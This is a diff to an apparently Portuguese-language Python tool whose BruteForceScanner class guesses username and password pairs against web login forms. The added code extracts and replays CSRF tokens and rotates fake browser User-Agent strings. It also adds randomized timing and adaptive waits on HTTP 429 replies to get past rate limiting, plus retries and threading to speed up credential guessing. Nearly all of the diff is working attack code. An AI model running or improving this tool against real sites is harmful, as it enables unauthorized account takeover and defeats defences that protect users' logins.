@@ -5,6 +5,8 @@ import argparse
 from datetime import datetime, timedelta
 from io import BytesIO
 from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
+import concurrent.futures
 import re
 from urllib.parse import urljoin, urlparse, urlunparse, parse_qs, urlencode
 import ssl
@@ -2206,6 +2208,21 @@ class BruteForceScanner:
         self.session = requests.Session()
         self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
         self.found_credential = None
+        self._stop_event = threading.Event()
+        self._lock = threading.Lock()
+        self._user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+        ]
+        self._retry_attempts = 3
+        self._retry_delay = 1.0
+        self._request_timeout = 10
+        self._rate_limit_delay = 0
+        self._last_request_time = 0
+        self._session_cookies = {}
+        self._csrf_token = None
 
     def _load_list_from_file(self, file_path):
         """Carrega uma lista (usuários ou senhas) de um arquivo."""
@@ -2221,9 +2238,33 @@ class BruteForceScanner:
 
     def _get_form_details(self):
         """Obtém o URL de action, método e todos os campos do formulário."""
+        # Implementa retry para conexão inicial
+        for attempt in range(3):
+            try:
+                response = self.session.get(self.url, verify=False, timeout=15)
+                soup = BeautifulSoup(response.content, 'html.parser')
+                break
+            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
+                if attempt < 2:
+                    console.print(f"[yellow][!] Tentativa {attempt + 1} falhou, tentando novamente em 3s...[/yellow]")
+                    time.sleep(3)
+                    continue
+                else:
+                    console.print(f"[bold red][!] Erro ao conectar após 3 tentativas: {e}[/bold red]")
+                    console.print("[bold red][!] Verifique a conectividade de rede ou tente outro site.[/bold red]")
+                    return None, None, None
+        
         try:
-            response = self.session.get(self.url, verify=False, timeout=10)
-            soup = BeautifulSoup(response.content, 'html.parser')
+            
+            # Procura por tokens CSRF
+            csrf_inputs = soup.find_all('input', {'name': re.compile(r'csrf|_token|authenticity_token', re.I)})
+            if csrf_inputs:
+                self._csrf_token = csrf_inputs[0].get('value')
+            
+            # Procura por tokens CSRF em meta tags
+            csrf_meta = soup.find('meta', {'name': re.compile(r'csrf|_token', re.I)})
+            if csrf_meta and not self._csrf_token:
+                self._csrf_token = csrf_meta.get('content')
             
             form = None
             # Itera em todos os formulários para encontrar o correto, de forma mais robusta.
@@ -2247,6 +2288,22 @@ class BruteForceScanner:
                 value = input_tag.get('value', '')
                 if name:
                     base_payload[name] = value
+            
+            # Adiciona token CSRF se encontrado
+            if self._csrf_token:
+                # Tenta diferentes nomes comuns para campos CSRF
+                csrf_field_names = ['csrf_token', '_token', 'authenticity_token', 'csrfmiddlewaretoken']
+                for field_name in csrf_field_names:
+                    if field_name in base_payload or any(field_name.lower() in k.lower() for k in base_payload.keys()):
+                        # Atualiza o token CSRF no payload
+                        for k in base_payload.keys():
+                            if field_name.lower() in k.lower():
+                                base_payload[k] = self._csrf_token
+                                break
+                        break
+                else:
+                    # Se não encontrou campo CSRF, adiciona um genérico
+                    base_payload['csrf_token'] = self._csrf_token
 
             return action_url, method, base_payload
         except requests.RequestException as e:
@@ -2255,45 +2312,137 @@ class BruteForceScanner:
 
     def _test_credential(self, username, password, action_url, method, base_payload):
         """Testa um único par de credenciais (usuário/senha), suportando GET e POST."""
-        if self.found_credential:  # Se já encontrou, não faz mais testes
+        if self._stop_event.is_set():  # Verifica se deve parar
             return None
 
+        # Implementa delay adaptativo e randomizado
+        import random
+        current_time = time.time()
+        
+        # Calcula delay baseado na taxa de requisições
+        if self._last_request_time > 0:
+            elapsed = current_time - self._last_request_time
+            min_delay = max(self.delay, self._rate_limit_delay)
+            if elapsed < min_delay:
+                sleep_time = min_delay - elapsed
+                time.sleep(sleep_time)
+        
+        # Adiciona variação aleatória
         if self.delay > 0:
-            time.sleep(self.delay)
+            delay_variation = random.uniform(0.7, 1.3)
+            time.sleep(self.delay * delay_variation)
+        
+        self._last_request_time = time.time()
 
         # Cria o payload para esta tentativa específica
         payload = base_payload.copy() # Começa com todos os campos do formulário
         payload[self.user_field] = username # Define o usuário da tentativa
         payload[self.pass_field] = password # Define a senha da tentativa
         
-        # Adiciona o cabeçalho Referer para simular melhor um navegador real
-        headers = {'Referer': self.url}
+        # Adiciona cabeçalhos realistas para simular melhor um navegador real
+        import random
+        headers = {
+            'Referer': self.url,
+            'User-Agent': random.choice(self._user_agents),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
+        }
+        
+        # Implementa retry com backoff exponencial
+        for attempt in range(self._retry_attempts):
+            try:
+                response = None
+                if method == 'post':
+                    response = self.session.post(action_url, data=payload, headers=headers, verify=False, timeout=self._request_timeout, allow_redirects=True)
+                else: # GET
+                    response = self.session.get(action_url, params=payload, headers=headers, verify=False, timeout=self._request_timeout, allow_redirects=True)
+                
+                # Verifica se recebeu rate limiting
+                if response.status_code == 429:
+                    retry_after = response.headers.get('Retry-After', '60')
+                    try:
+                        self._rate_limit_delay = float(retry_after)
+                    except ValueError:
+                        self._rate_limit_delay = 60
+                    
+                    if attempt < self._retry_attempts - 1:
+                        time.sleep(self._rate_limit_delay)
+                        continue
+                    else:
+                        return None
+                
+                # Se chegou aqui, a requisição foi bem-sucedida
+                break
+                
+            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
+                if attempt < self._retry_attempts - 1:
+                    # Backoff exponencial com jitter
+                    import random
+                    backoff_delay = self._retry_delay * (2 ** attempt) + random.uniform(0, 1)
+                    time.sleep(backoff_delay)
+                    continue
+                else:
+                    # Última tentativa falhou
+                    return None
+            except requests.exceptions.RequestException:
+                # Erro não recuperável
+                return None
+        
+        if response is None:
+            return None
         
         try:
-            response = None
-            if method == 'post':
-                response = self.session.post(action_url, data=payload, headers=headers, verify=False, timeout=7, allow_redirects=True)
-            else: # GET
-                response = self.session.get(action_url, params=payload, headers=headers, verify=False, timeout=7, allow_redirects=True)
 
-            # **LÓGICA DE DETECÇÃO DE SUCESSO CORRIGIDA**
-            # A lógica agora é mais explícita e robusta.
-            # O usuário deve fornecer pelo menos uma das strings de condição.
+            # **LÓGICA DE DETECÇÃO DE SUCESSO APRIMORADA**
+            # Verifica múltiplos indicadores de sucesso/falha
+            
+            # Verifica códigos de status HTTP
+            status_success = response.status_code in [200, 302, 301]  # Sucesso ou redirecionamento
             
             # Condição 1: A string de sucesso deve estar presente (se fornecida)
-            success_condition_met = (self.success_string in response.text) if self.success_string else True
+            success_condition_met = True
+            if self.success_string:
+                success_condition_met = self.success_string in response.text
             
             # Condição 2: A string de falha não deve estar presente (se fornecida)
-            failure_condition_met = (self.failure_string not in response.text) if self.failure_string else True
+            failure_condition_met = True
+            if self.failure_string:
+                failure_condition_met = self.failure_string not in response.text
+            
+            # Verifica redirecionamentos suspeitos (possível sucesso)
+            redirect_success = len(response.history) > 0 and response.url != action_url
+            
+            # Verifica se o tamanho da resposta é diferente (possível sucesso)
+            content_length_diff = len(response.content) > 1000  # Páginas de sucesso geralmente são maiores
+            
+            # Lógica de detecção combinada
+            login_success = False
+            if self.success_string and self.failure_string:
+                # Ambas as strings fornecidas - ambas devem ser satisfeitas
+                login_success = success_condition_met and failure_condition_met and status_success
+            elif self.success_string:
+                # Apenas string de sucesso fornecida
+                login_success = success_condition_met and status_success
+            elif self.failure_string:
+                # Apenas string de falha fornecida
+                login_success = failure_condition_met and status_success
+            else:
+                # Nenhuma string fornecida - usa heurísticas
+                login_success = status_success and (redirect_success or content_length_diff)
+            
+            if login_success:
+                with self._lock:
+                    if not self._stop_event.is_set():
+                        self._stop_event.set()
+                        self.found_credential = (username, password)
+                        return (username, password)
 
-            # O login é bem-sucedido se as condições aplicáveis forem verdadeiras.
-            # Se o usuário fornecer ambas, ambas devem ser satisfeitas.
-            if success_condition_met and failure_condition_met:
-                self.found_credential = (username, password)
-                return (username, password)
-
-        except requests.RequestException:
-            pass
+        except Exception:
+            # Erro inesperado na análise da resposta
+            return None
         return None
 
     def run_scan(self):
@@ -2343,20 +2492,41 @@ class BruteForceScanner:
             
             with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console) as progress:
                 p_task = progress.add_task(f"[green]Testando {len(tasks)} credenciais...", total=len(tasks))
-                for future in as_completed(future_to_cred):
-                    # Interrompe o loop principal assim que uma credencial for encontrada
-                    if self.found_credential:
-                        break
-                    result = future.result()
-                    if result:
-                        found_credential = result
-                        # Sinaliza para outras threads pararem e quebra o loop
-                        self.found_credential = found_credential
-                        break 
-                    progress.update(p_task, advance=1)
+                completed_tasks = 0
                 
-                # Garante que a barra de progresso seja concluída para evitar sobreposição de texto
-                progress.update(p_task, completed=len(tasks))
+                for future in as_completed(future_to_cred):
+                    # Verifica se deve parar
+                    if self._stop_event.is_set():
+                        # Cancela todas as tarefas pendentes
+                        for f in future_to_cred:
+                            f.cancel()
+                        break
+                    
+                    try:
+                        result = future.result(timeout=1)  # Timeout rápido para não travar
+                        completed_tasks += 1
+                        
+                        if result:
+                            found_credential = result
+                            # Cancela todas as tarefas pendentes
+                            for f in future_to_cred:
+                                if not f.done():
+                                    f.cancel()
+                            break
+                        
+                        progress.update(p_task, advance=1)
+                        
+                    except concurrent.futures.TimeoutError:
+                        # Timeout na tarefa individual - continua
+                        completed_tasks += 1
+                        progress.update(p_task, advance=1)
+                    except Exception:
+                        # Erro na tarefa individual - continua
+                        completed_tasks += 1
+                        progress.update(p_task, advance=1)
+                
+                # Garante que a barra de progresso seja concluída
+                progress.update(p_task, completed=completed_tasks)
         
         # A impressão do resultado agora é feita fora dos contextos de progresso e executor
         console.print("-" * 60)
